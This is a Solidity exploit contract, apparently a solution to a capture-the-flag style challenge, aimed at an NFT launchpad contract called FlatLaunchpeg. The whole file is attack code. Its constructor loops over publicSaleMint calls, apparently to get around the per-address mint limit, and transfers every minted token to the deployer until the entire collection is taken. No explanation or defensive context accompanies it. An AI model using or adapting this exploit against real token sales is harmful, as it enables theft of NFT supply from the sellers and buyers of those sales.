// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "./FlatLaunchpeg.sol";

contract Exploit {
    constructor(address nftAddress) {
        FlatLaunchpeg nft = FlatLaunchpeg(nftAddress);
        uint256 maxPerAddress = nft.maxPerAddressDuringMint();
        uint256 loops = nft.collectionSize() / maxPerAddress;

        uint256 lastTokenId;
        for (uint256 i=0; i < loops; i++){
            nft.publicSaleMint(maxPerAddress);
            for (uint256 j=lastTokenId; j < lastTokenId + maxPerAddress; j++){
                nft.safeTransferFrom(address(this), msg.sender, j);
            }
            lastTokenId = lastTokenId + maxPerAddress;
        }

        // remaining
        uint256 remining = nft.collectionSize() - lastTokenId;
        nft.publicSaleMint(remining);
        for (uint256 j=lastTokenId; j < lastTokenId + remining; j++){
                nft.safeTransferFrom(address(this), msg.sender, j);
            }

    }
}